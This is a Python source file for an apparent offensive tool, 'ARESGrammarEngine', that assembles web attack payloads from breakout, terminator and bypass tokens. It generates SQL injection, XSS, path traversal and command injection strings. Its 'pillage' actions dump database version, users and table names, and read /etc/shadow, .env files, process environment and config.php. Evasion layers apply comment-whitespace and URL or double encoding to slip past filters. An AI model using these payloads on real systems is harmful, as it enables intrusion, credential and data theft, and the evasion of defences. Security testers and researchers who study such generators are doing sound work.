import logging
from typing import List, Dict, Any, Optional

logger = logging.getLogger(__name__)

class ARESGrammarEngine:
    """
    Advanced Grammar-based mutation engine for ARES.
    Constructs payloads from tokens: [BREAKOUT][ACTION][BYPASS][TERMINATOR]
    """
    
    def __init__(self):
        self.tokens = {
            "breakout": {
                "js_string": ["'; ", "\"; ", "'; //", "\"; //", "'-", "\"-"],
                "html_attr": ["\" ", "' ", "\">", "'>"],
                "html_text": [">", "</div>", "</span>", "-->", "]]>"],
                "sql_query": ["' ", "\" ", ") ", "') ", "\") ", "')) "]
            },
            "terminator": {
                "js": [" //", " /*", ";"],
                "sql": ["-- -", "#", "/*", " --", ";--"],
                "shell": [" #", " &", " |", " ;"]
            },
            "bypass": {
                "whitespace": ["/**/", "%20", "+", "%09", "%0a"],
                "logic": [" OR 1=1", " AND 1=1", " UNION SELECT "]
            }
        }

    def generate_payload(self, context_type: str, action: str, evasion_layer: Optional[str] = None) -> List[str]:
        """
        Builds a set of payloads based on the context and desired action.
        """
        payloads = []
        breakouts = self.tokens["breakout"].get(context_type, [""])
        
        # Base templates
        for b in breakouts:
            # ── 1. Verification Actions ──
            if action == "verify_sqli":
                payloads.append(f"{b}OR 1=1{self._get_term('sql')}")
                payloads.append(f"{b}AND 1=1{self._get_term('sql')}")
                payloads.append(f"{b}AND SLEEP(5){self._get_term('sql')}")
            
            elif action == "verify_xss":
                payloads.append(f"{b}<svg/onload=alert(1)>")
                payloads.append(f"{b}<img src=x onerror=alert(1)>")
                payloads.append(f"{b}<details/open/ontoggle=alert(1)>")
                
            elif action == "verify_lfi":
                payloads.append(f"/etc/passwd")
                payloads.append(f"../../../../../../etc/passwd")
                payloads.append(f"....//....//....//....//etc/passwd")

            elif action == "verify_cmdi":
                payloads.append(f"{b}; id")
                payloads.append(f"{b}| whoami")
                payloads.append(f"{b}$(id)")

            # ── 2. Impact Actions (Pillage) ──
            elif action == "pillage_db":
                payloads.append(f"{b}UNION SELECT NULL,@@version,NULL,NULL{self._get_term('sql')}")
                payloads.append(f"{b}UNION SELECT NULL,user(),database(),NULL{self._get_term('sql')}")
                payloads.append(f"{b}UNION SELECT NULL,table_name,NULL,NULL FROM information_schema.tables{self._get_term('sql')}")

            elif action == "pillage_files":
                payloads.append(f"/etc/shadow")
                payloads.append(f"/.env")
                payloads.append(f"/proc/self/environ")
                payloads.append(f"/var/www/html/config.php")

        # ── 3. Apply Evasion Layers ──
        if evasion_layer == "whitespace":
            payloads = [p.replace(" ", "/**/") for p in payloads]
        elif evasion_layer == "encoding":
            # (Simple URL encoding for now)
            import urllib.parse
            payloads = [urllib.parse.quote(p) for p in payloads]
        elif evasion_layer == "double_encoding":
            import urllib.parse
            payloads = [urllib.parse.quote(urllib.parse.quote(p)) for p in payloads]
            
        return list(dict.fromkeys(payloads))

    def _get_term(self, lang: str) -> str:
        terms = self.tokens["terminator"].get(lang, [""])
        return terms[0] if terms else ""

grammar_engine = ARESGrammarEngine()
